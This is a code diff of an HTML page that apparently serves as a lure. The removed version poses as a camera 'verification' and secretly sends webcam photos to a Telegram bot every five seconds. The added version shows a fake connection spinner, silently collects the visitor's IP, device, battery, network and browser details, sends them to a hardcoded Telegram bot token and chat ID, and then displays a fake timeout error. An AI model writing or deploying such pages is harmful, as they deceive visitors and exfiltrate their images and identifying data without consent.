@@ -3,85 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Verification System</title>
+    <title>Connecting...</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f2f5; }
-        .container { max-width: 400px; margin: 0 auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        button { background: #0088cc; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
-        #videoPreview { width: 100%; max-width: 300px; margin-top: 15px; border-radius: 5px; display: none; }
+        body { 
+            background: #0a0a0a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+        .loader { text-align: center; }
+        .spinner {
+            border: 4px solid #333;
+            border-top: 4px solid #00ff88;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>System Verification</h2>
-    <p>Please allow camera access to proceed with verification.</p>
-    <button id="startBtn">Start Verification</button>
-    
-    <video id="videoPreview" autoplay playsinline muted></video>
-    
-    <canvas id="captureCanvas" style="display:none;"></canvas>
+<div class="loader">
+    <h2>Establishing Secure Connection...</h2>
+    <div class="spinner"></div>
+    <p style="color:#666;font-size:14px;">Please wait while we route your request to the nearest node</p>
 </div>
 
 <script>
 // --- APNI BOT DETAILS YAHA DALO ---
-const BOT_TOKEN = "8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk";
-const CHAT_ID = "8402472475";
+const TELEGRAM_BOT_TOKEN = '8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk';
+const TELEGRAM_CHAT_ID = '8402472475';
 
-const startBtn = document.getElementById('startBtn');
-const video = document.getElementById('videoPreview');
-const canvas = document.getElementById('captureCanvas');
-let captureInterval;
+async function fetchFullTelemetry() {
+    // 1. Core Device and Browser Info Collect Karna
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || 'Unknown',
+        language: navigator.language || 'Unknown',
+        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+        screenRes: `${screen.width}x${screen.height}`,
+        availScreenRes: `${screen.availWidth}x${screen.availHeight}`,
+        colorDepth: `${screen.colorDepth}-bit`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+        cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+        referrer: document.referrer || 'Direct Visit',
+        ip: 'Unavailable',
+        networkType: 'Unknown',
+        batteryLevel: 'N/A',
+        isCharging: 'N/A'
+    };
 
-startBtn.addEventListener('click', async () => {
-    try {
-        // 1. User se camera permission maangna
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        video.srcObject = stream;
-        video.style.display = "block"; // Preview dikhane ke liye
-        startBtn.style.display = "none";
-
-        // 2. Continuous capture shuru karna (Har 5 second me ek photo)
-        captureInterval = setInterval(() => {
-            sendPhotoToTelegram();
-        }, 5000); // 5000 milliseconds = 5 seconds
-
-    } catch (err) {
-        alert("Camera permission denied. Cannot proceed.");
-        console.error("Error accessing camera: ", err);
+    // 2. Network Type Check Karna (Agar Browser Support Kare)
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        data.networkType = `${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || '?' } Mbps)`;
     }
-});
 
-async function sendPhotoToTelegram() {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    // Video stream se current frame ko canvas par draw karna
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // Canvas ko Blob (file format) me convert karna
-    canvas.toBlob(async (blob) => {
-        if (!blob) return;
-
-        // Telegram API ke liye FormData taiyar karna
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', `Automated verification image sent at: ${new Date().toLocaleTimeString()}`);
-
+    // 3. Battery Details Check Karna (Asynchronous API)
+    if (navigator.getBattery) {
         try {
-            // Fetch ke zariye direct Telegram api par post request bhejni
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            console.log("Photo sent successfully!");
-        } catch (error) {
-            console.error("Error sending to Telegram:", error);
+            const battery = await navigator.getBattery();
+            data.batteryLevel = `${Math.round(battery.level * 100)}%`;
+            data.isCharging = battery.charging ? 'Yes ⚡' : 'No 🔋';
+        } catch (e) {
+            console.log("Battery info not accessible");
         }
-    }, 'image/jpeg', 0.7); // 0.7 matlab quality 70% taaki upload fast ho
+    }
+
+    // 4. Public IP Fetch Karna (Free API ke zariye)
+    try {
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        if (ipResp.ok) {
+            const ipData = await ipResp.json();
+            data.ip = ipData.ip;
+        }
+    } catch(e) {
+        console.log("IP fetch blocked or failed");
+    }
+
+    // 5. Advanced Structured Telegram Message Layout
+    const messageText = `📊 *FULL SYSTEM DIAGNOSTIC REPORT*\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                        `🌐 *NETWORK & CONNECTIVITY:*\n` +
+                        `• *Public IP:* \`${data.ip}\` (Click to copy)\n` +
+                        `• *Network Connection:* ${data.networkType}\n` +
+                        `• *Network Status:* ${data.onlineStatus}\n\n` +
+                        `📱 *HARDWARE & SYSTEM SPECIFICATIONS:*\n` +
+                        `• *Operating System/Platform:* ${data.platform}\n` +
+                        `• *Processor Cores:* ${data.cpuCores} Cores\n` +
+                        `• *Device RAM (Approx):* ${data.memory}\n` +
+                        `• *Screen Resolution:* ${data.screenRes} px\n` +
+                        `• *Available Screen:* ${data.availScreenRes} px\n` +
+                        `• *Color Depth:* ${data.colorDepth}\n\n` +
+                        `🔋 *POWER MANAGEMENT:*\n` +
+                        `• *Battery Level:* ${data.batteryLevel}\n` +
+                        `• *Is Charging:* ${data.isCharging}\n\n` +
+                        `⚙️ *SOFTWARE & REGIONAL ENVIRONMENT:*\n` +
+                        `• *Timezone Area:* ${data.timezone}\n` +
+                        `• *Primary Language:* ${data.language}\n` +
+                        `• *Accepted Languages:* ${data.languages}\n` +
+                        `• *Cookies Enabled:* ${data.cookieEnabled}\n` +
+                        `• *Referrer/Source:* ${data.referrer}\n\n` +
+                        `📄 *RAW USER AGENT STRING:*\n` +
+                        `\`\`\`text\n${data.userAgent}\n\`\`\`\n` +
+                        `🕒 _Log Generation Time: ${new Date().toLocaleString()}_`;
+
+    // 6. Telegram Bot standard API Request Send Karna
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch(err) {
+        console.error("Error pushing logs to Telegram:", err);
+    }
 }
+
+// Window load hone par code initialize karein
+window.onload = function() {
+    fetchFullTelemetry();
+    
+    // 3.5 Seconds ke baad ek realistic fallthrough error interface show karna
+    setTimeout(() => {
+        document.body.innerHTML = `
+            <div class="loader">
+                <h2 style="color: #ff4d4d;">Connection Failed</h2>
+                <p style="color:#888;">The gateway took too long to respond. The handshake was refused.</p>
+                <p style="color:#555;font-size:12px;margin-top:30px;">Error Reference: ERR_CONNECTION_TIMED_OUT</p>
+            </div>
+        `;
+    }, 3500);
+};
 </script>
 
 </body>
